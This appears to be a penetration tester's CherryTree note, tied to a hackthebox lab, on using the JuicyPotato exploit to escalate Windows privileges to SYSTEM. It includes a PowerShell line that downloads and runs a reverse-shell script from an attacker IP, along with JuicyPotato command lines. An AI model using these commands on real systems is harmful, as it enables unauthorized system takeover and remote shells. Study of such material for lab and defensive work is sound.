<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>JuicyPotato</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># JuicyPotato</h1></strong><br /><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a><br /><br />JuicyPotato is a fork of the original exploit called RottenPotatoNG<br />JuicyPotato, when you have <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges, exploits a privilege escalation chain based on the BITS (Background Intelligent Transfer Service) service having a MiTM listener on 127.0.0.1:6666.<br /><br />• <em>It doesn&#39;t work on Windows 10 1809</em>.<br /><br /><strong>Examples:</strong><br />• hackthebox Conceal<br /><br /><strong><h2>## Usage</h2></strong><br />• You create a <code>.bat</code> script containing the commands you want JuicyPotato to run<br />• The <code>.bat</code> script will run as SYSTEM<br /><br /><strong>1. Create </strong><strong><code>.bat</code></strong><strong> script with commands you want to run as SYSTEM</strong><br /><code>nano commands.bat</code><br /><code>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.9.122.8/Invoke-PowerShellTcp.ps1&#39;)&quot;</code><br /><br /><strong>2. Upload JuicyPotato.exe and .bat to target</strong><br />Via whatever means you like<br /><br /><strong>3. Run JuicyPotato.exe</strong><br />   ◇ <code>-t *</code> - to try both CreateProcessWithTokenW and CreateProcessAsUser create process calls<br />   ◇ <code>-p</code> - to specify the program/command to run (your .bat script)<br />   ◇ <code>-l</code> - to specify a random COM port to listen on<br /><br /><code>JuicyPotato.exe -t * -p commands.bat -l 6767</code><br /><br /><span style="text-decoration:underline;">If you have errors, try a different CLSID</span><br />• <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br /><br /><em>wuaserv</em><br />• <code>wuaserv</code> is the Windows Update Service, which should be installed on every system<br /><code>.\JuicyPotato.exe -t * -p adminshell.bat -l 6789 -c &quot;{e60687f7-01a1-40aa-86ac-db1cbf673334}&quot;</code></div>
</body>
</html>
